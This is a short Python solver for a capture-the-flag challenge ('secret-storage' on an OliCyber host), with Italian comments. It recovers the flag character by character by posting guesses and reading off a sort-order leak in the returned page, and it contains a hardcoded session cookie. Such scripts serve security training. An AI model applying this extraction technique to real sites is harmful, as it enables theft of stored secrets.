import requests
import re

session = requests.Session()

site = 'https://secret-storage.challs.olicyber.it/?order=secret'

alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_}1234567890'
flag = 'flag{'
while True:
    for i in alpha:
        ## Inserire il proprio cookie 
        cookie = { "connect.sid":"s%3AWkXmAwmLzcd30LBckuN0DYCvafbkoF7d.fvwzvaakKF1j4s5U%2FtghA%2FZBJvfiCW31cBTE9%2BikMmc"}
        finding_flag = flag + i

        print(f"Provando {finding_flag} ... ")
        data = {
            "name": finding_flag,
            "secret": finding_flag
        }
        r = session.post(site,data=data,cookies=cookie)
    

    find = re.findall(r'\bflag\S*', r.text)
    for i in range(len(find)):
            if find[i] == "flag</td>":
                idx_real = i

    flag = str(find[idx_real-1]).replace('</td>','')
    print(f"FLAG TROVATA FINORA --> {flag}")
    if flag.endswith('}'):
        break

print(f"FLAG TROVATA --> {flag}")    

